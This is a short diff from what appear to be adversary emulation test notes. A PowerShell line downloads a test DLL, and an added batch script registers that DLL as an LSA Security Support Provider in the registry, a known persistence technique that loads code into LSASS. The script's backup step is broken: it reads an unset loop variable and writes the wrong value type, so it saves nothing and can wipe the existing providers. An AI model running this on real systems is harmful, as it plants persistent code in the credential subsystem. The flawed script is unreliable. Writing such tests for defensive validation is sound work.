@@ -169,3 +169,19 @@ rem Download DLL file
 powershell -Command "Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll' -OutFile 'c:\Tools\AtomicTest.dll'"
 
 
+
+** Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry
+
+@echo off
+
+rem Get the current value of 'Security Packages'
+for /f "tokens=*" %%A in ('reg query "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages" ^| find "Security Packages"') do set oldvalue=%%B
+
+rem Backup the current value
+reg add "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages old" /t REG_SZ /d "%oldvalue%" /f
+
+rem Set the new value
+reg add "HKLM\System\CurrentControlSet\Control\Lsa\OSConfig" /v "Security Packages" /t REG_SZ /d "AtomicTest.dll" /f
+
+
+
